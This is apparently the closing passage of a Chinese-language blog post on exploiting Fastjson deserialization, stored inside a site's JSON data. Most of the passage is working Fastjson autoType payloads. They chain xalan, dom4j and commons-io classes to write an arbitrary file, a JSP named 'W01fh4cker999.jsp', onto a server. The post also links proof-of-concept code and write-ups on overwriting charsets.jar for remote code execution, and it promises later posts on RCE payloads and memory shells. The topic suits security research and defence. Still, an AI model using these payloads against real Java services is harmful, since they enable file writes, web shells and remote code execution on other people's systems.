1{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.apache.xml.dtm.DTMConfigurationException&quot;,&quot;locator&quot;:{}} 1{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;org.apache.xml.dtm.DTMConfigurationException&quot;,&quot;locator&quot;:{}}}} 1{&quot;su14&quot;:{&quot;@type&quot;:&quot;javax.xml.transform.SourceLocator&quot;,&quot;@type&quot;:&quot;org.apache.xpath.objects.XNodeSetForDOM&quot;,&quot;nodeIter&quot;:{&quot;@type&quot;:&quot;org.apache.xpath.NodeSet&quot;},&quot;xctxt&quot;:{&quot;@type&quot;:&quot;org.apache.xpath.XPathContext&quot;,&quot;primaryReader&quot;:{&quot;@type&quot;:&quot;org.dom4j.io.XMLWriter&quot;,&quot;entityResolver&quot;:{&quot;@type&quot;:&quot;org.dom4j.io.SAXContentHandler&quot;,&quot;inputSource&quot;:{&quot;byteStream&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;}}}}}}} 1{&quot;su16&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;W01fh4ckeraaaaaa...&quot;,&quot;start&quot;:0,&quot;end&quot;:2147483647},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;branch&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,&quot;writer&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,&quot;file&quot;:&quot;W01fh4cker999.jsp&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;append&quot;:false},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024,&quot;writeImmediately&quot;:true},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]},&quot;su17&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.inputStream.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.inputStream.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]},&quot;su18&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.inputStream.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.inputStream.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]},&quot;su19&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.inputStream.input&quot;},&quot;branch&quot;:{&quot;$ref&quot;:&quot;$.su16.delegate.reader.inputStream.branch&quot;},&quot;closeBranch&quot;:true},&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36,82]}]}} 5.3.3 xalan+dom4j+commons-io+aspectjtools+commons-codec组合利用链这条链主要是为了解决前面提到的的io链无法写入复杂文件结构的问题，文件依旧需要大于8kb才能写入。poc地址如下： https://github.com/safe6Sec/ShiroAndFastJson/blob/master/src/main/java/com/shiro/vuln/fastjson/Fastjson31_xalan_dom4j_io_write_4.java 5.4 覆盖charsets.jar导致RCE这里不做复现，可参考： https://landgrey.me/blog/22/ https://threedr3am.github.io/2021/04/14/JDK8任意文件写场景下的SpringBoot RCE/ https://forum.butian.net/share/1623 https://mp.weixin.qq.com/s/0yyZH_Axa0UTr8kquSixwQ 其中第四篇是对其做了完整详细的复现。 六、总结与致谢由于接下来一段时间会很忙，因此还是决定把fastjson利用提高篇分两部分来写，第一部分也就是本文主要介绍各个json库之间的判断方法、fastjson版本判断方法、服务器环境的探测方法、文件读取的方法以及文件写入的方法。 在第二篇文章中，我们将讨论fastjson各版本的rce的payload、fastjson内网不出网情况下的利用、fastjson内存马注入。 由于经常熬夜，写文章的时候难免头脑发昏出现错误，欢迎在公众号后台或者我的朋友圈留言指出，我将在下一篇文章的开头对提出来的师傅进行感谢。 感谢以下师傅写的文章，本文或参考或引用，在他们的基础上进行了总结和修改： 123456789101112131415161718192021222324252627282930https://b1ue.cn/archives/402.htmlhttps://blog.csdn.net/m0_71692682/article/details/125814861https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxAhttps://github.com/safe6Sec/Fastjsonhttps://github.com/su18/hack-fastjson-1.2.80https://kingx.me/Details-in-FastJson-RCE.htmlhttps://blog.csdn.net/2301_77315080/article/details/133755409https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/https://wangdudu.blog.csdn.net/article/details/121627213https://blog.noah.360.net/blackhat-2021yi-ti-xiang-xi-fen-xi-fastjsonfan-xu-lie-hua-lou-dong-ji-zai-qu-kuai-lian-ying-yong-zhong-de-shen-tou-li-yong-2/https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyghttps://blog.51cto.com/u_15945480/6028934https://mp.weixin.qq.com/s/SwkJVTW3SddgA6uy_e59qghttps://moonsec.top/articles/112https://y4er.com/posts/fastjson-1.2.80/#gadgethttps://www.freebuf.com/news/347174.htmlhttps://www.freebuf.com/vuls/361576.htmlhttps://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdfhttps://b1ue.cn/archives/506.htmlhttps://mp.weixin.qq.com/s?src=11×tamp=1697804173&amp;ver=4846&amp;signature=hOU1Dr6toY8j7eZ0B9ztaRNcZRvWXgr8SW4ER3pbsNrHVxEkxKqLB38qX3BOfN8XgTKqHR9wH70P9nKtKEw5-XzOXS3YoxcDFhn4fi-Gw*x6gswLM2I2zq2i7BZ-PwI1&amp;new=1https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.htmlhttps://forum.ezreal.cool/thread-117-1-1.htmlhttps://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6/https://su18.org/post/fastjson/#%E5%9B%9B-payloadhttps://mp.weixin.qq.com/s/nKPsoNkHtNdOj-_v53Bc9whttps://xz.aliyun.com/t/12492#toc-4https://landgrey.me/blog/22/https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fghttps://www.yulegeyu.com/https://mp.weixin.qq.com/s/0yyZH_Axa0UTr8kquSixwQ","link":"/2024/12/30/LearnFastjsonVulnFromZero-Improvement/"}],"tags":[{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Memshell","slug":"Memshell","link":"/tags/Memshell/"},{"name":"Fastjson","slug":"Fastjson","link":"/tags/Fastjson/"}],"categories":[],"pages":[]}